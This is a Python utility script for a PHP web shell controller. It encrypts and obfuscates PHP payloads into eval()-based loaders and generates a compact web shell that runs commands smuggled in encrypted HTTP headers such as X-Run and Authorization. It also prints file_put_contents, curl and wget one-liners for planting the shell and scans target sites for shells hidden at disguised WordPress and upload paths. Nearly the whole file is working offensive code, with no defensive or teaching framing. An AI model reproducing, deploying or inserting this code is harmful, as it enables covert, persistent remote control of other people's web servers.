#!/usr/bin/env python3
"""
PHP Web Shell Utilities
-----------------------
Additional utilities for the PHP web shell controller.
"""

import os
import sys
import base64
import random
import string
import hashlib
import argparse
import requests
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

def generate_encryption_key():
    """Generate a random encryption key."""
    key = base64.b64encode(os.urandom(16)).decode('utf-8')
    print(f"{Fore.GREEN}Generated encryption key: {key}")
    return key

def encrypt_payload(payload_file, output_file, key=None):
    """Encrypt a PHP payload file."""
    if not key:
        key = generate_encryption_key()
    
    try:
        with open(payload_file, 'r') as f:
            payload = f.read()
        
        # Simple XOR encryption for demonstration
        encrypted = []
        key_bytes = key.encode('utf-8')
        for i, char in enumerate(payload):
            key_char = key_bytes[i % len(key_bytes)]
            encrypted.append(chr(ord(char) ^ key_char))
        
        encrypted_payload = ''.join(encrypted)
        encoded = base64.b64encode(encrypted_payload.encode('utf-8')).decode('utf-8')
        
        # Create a loader that will decrypt and execute the payload
        loader = f"""<?php
        // PHP Web Shell Loader
        $key = '{key}';
        $payload = base64_decode('{encoded}');
        $decrypted = '';
        $key_bytes = str_split($key);
        $payload_bytes = str_split($payload);
        foreach ($payload_bytes as $i => $char) {{
            $key_char = $key_bytes[$i % count($key_bytes)];
            $decrypted .= chr(ord($char) ^ ord($key_char));
        }}
        eval($decrypted);
        ?>"""
        
        with open(output_file, 'w') as f:
            f.write(loader)
        
        print(f"{Fore.GREEN}Encrypted payload saved to {output_file}")
        print(f"{Fore.YELLOW}Use the key '{key}' when connecting with the controller.")
        
        return True
    except Exception as e:
        print(f"{Fore.RED}Error encrypting payload: {str(e)}")
        return False

def generate_one_liner(url, key):
    """Generate a one-liner to deploy the shell."""
    # Create a minimal version of the shell for the one-liner
    minimal_shell = """<?php
    $k=base64_decode('KEY');
    $h=apache_request_headers();
    foreach(['X-Run','Authorization','X-Forwarded-For'] as $h_name){
        if(isset($h[$h_name])){
            $d=base64_decode($h[$h_name]);
            $i=substr($d,0,16);
            $d=substr($d,16);
            $d=openssl_decrypt($d,"AES-256-CBC",$k,0,$i);
            if($d){
                $p=explode('|',$d)[0];
                ob_start();
                system($p);
                $o=ob_get_clean();
                $i=openssl_random_pseudo_bytes(16);
                $e=openssl_encrypt($o."|".hash_hmac('sha256',$o,$k),"AES-256-CBC",$k,0,$i);
                echo base64_encode($i.$e);
                exit;
            }
        }
    }
    ?>"""
    
    # Replace the key placeholder
    minimal_shell = minimal_shell.replace('KEY', base64.b64encode(key.encode()).decode())
    
    # Encode the shell for the one-liner
    encoded_shell = base64.b64encode(minimal_shell.encode()).decode()
    
    # Generate one-liners for different methods
    
    # Method 1: Using file_put_contents
    method1 = f"<?php file_put_contents('{url}',base64_decode('{encoded_shell}')); ?>"
    
    # Method 2: Using curl
    method2 = f"curl -s -o {url} -d \"<?php eval(base64_decode('{encoded_shell}')); ?>\""
    
    # Method 3: Using wget
    method3 = f"wget -O {url} --post-data=\"<?php eval(base64_decode('{encoded_shell}')); ?>\" localhost"
    
    print(f"{Fore.CYAN}=== One-Liners to Deploy Shell ===")
    print(f"\n{Fore.YELLOW}Method 1 (PHP):")
    print(f"{Fore.WHITE}{method1}")
    
    print(f"\n{Fore.YELLOW}Method 2 (curl):")
    print(f"{Fore.WHITE}{method2}")
    
    print(f"\n{Fore.YELLOW}Method 3 (wget):")
    print(f"{Fore.WHITE}{method3}")
    
    return True

def scan_for_shells(target_url, wordlist=None):
    """Scan a target for common PHP shell locations."""
    if not wordlist:
        # Default list of common PHP shell locations
        wordlist = [
            '/.htaccess.php',
            '/wp-includes/functions.bak.php',
            '/cache/system.php',
            '/wp-content/uploads/cache.php',
            '/assets/js/analytics.inc.php',
            '/tmp/sess_RANDOM.php',
            '/images/RANDOM.php',
            '/includes/RANDOM.php',
            '/uploads/RANDOM.php',
            '/temp/RANDOM.php'
        ]
    
    # Replace RANDOM with actual random strings
    for i, path in enumerate(wordlist):
        if 'RANDOM' in path:
            random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
            wordlist[i] = path.replace('RANDOM', random_str)
    
    print(f"{Fore.YELLOW}Scanning {target_url} for PHP shells...")
    
    found_shells = []
    session = requests.Session()
    
    # Use a realistic user agent
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    })
    
    for path in wordlist:
        url = target_url.rstrip('/') + path
        try:
            response = session.get(url, timeout=5)
            
            # Check if the response looks like a PHP shell
            if response.status_code == 200:
                # Try a simple test command
                test_headers = {'X-Run': 'ZWNobyBTaGVsbFRlc3Q='}  # base64 of "echo ShellTest"
                test_response = session.get(url, headers=test_headers, timeout=5)
                
                if 'ShellTest' in test_response.text:
                    print(f"{Fore.GREEN}Found shell: {url} (Confirmed working)")
                    found_shells.append((url, True))
                else:
                    print(f"{Fore.YELLOW}Possible shell: {url} (Needs verification)")
                    found_shells.append((url, False))
        except Exception as e:
            pass
    
    if found_shells:
        print(f"\n{Fore.GREEN}Found {len(found_shells)} potential shells.")
        for url, confirmed in found_shells:
            status = f"{Fore.GREEN}Confirmed" if confirmed else f"{Fore.YELLOW}Unconfirmed"
            print(f"{status}: {url}")
    else:
        print(f"{Fore.RED}No shells found.")
    
    return found_shells

def main():
    parser = argparse.ArgumentParser(description='PHP Web Shell Utilities')
    subparsers = parser.add_subparsers(dest='command', help='Command to run')
    
    # Generate key command
    key_parser = subparsers.add_parser('genkey', help='Generate an encryption key')
    
    # Encrypt payload command
    encrypt_parser = subparsers.add_parser('encrypt', help='Encrypt a PHP payload')
    encrypt_parser.add_argument('payload', help='PHP payload file to encrypt')
    encrypt_parser.add_argument('output', help='Output file for the encrypted payload')
    encrypt_parser.add_argument('-k', '--key', help='Encryption key (generated if not provided)')
    
    # Generate one-liner command
    oneliner_parser = subparsers.add_parser('oneliner', help='Generate a one-liner to deploy the shell')
    oneliner_parser.add_argument('url', help='URL path where the shell will be deployed')
    oneliner_parser.add_argument('-k', '--key', help='Encryption key (generated if not provided)')
    
    # Scan for shells command
    scan_parser = subparsers.add_parser('scan', help='Scan a target for PHP shells')
    scan_parser.add_argument('target', help='Target URL to scan')
    scan_parser.add_argument('-w', '--wordlist', help='File containing paths to check')
    
    args = parser.parse_args()
    
    if args.command == 'genkey':
        generate_encryption_key()
    
    elif args.command == 'encrypt':
        encrypt_payload(args.payload, args.output, args.key)
    
    elif args.command == 'oneliner':
        key = args.key or generate_encryption_key()
        generate_one_liner(args.url, key)
    
    elif args.command == 'scan':
        wordlist = None
        if args.wordlist:
            try:
                with open(args.wordlist, 'r') as f:
                    wordlist = [line.strip() for line in f if line.strip()]
            except Exception as e:
                print(f"{Fore.RED}Error reading wordlist: {str(e)}")
                return
        
        scan_for_shells(args.target, wordlist)
    
    else:
        parser.print_help()


if __name__ == "__main__":
    main()

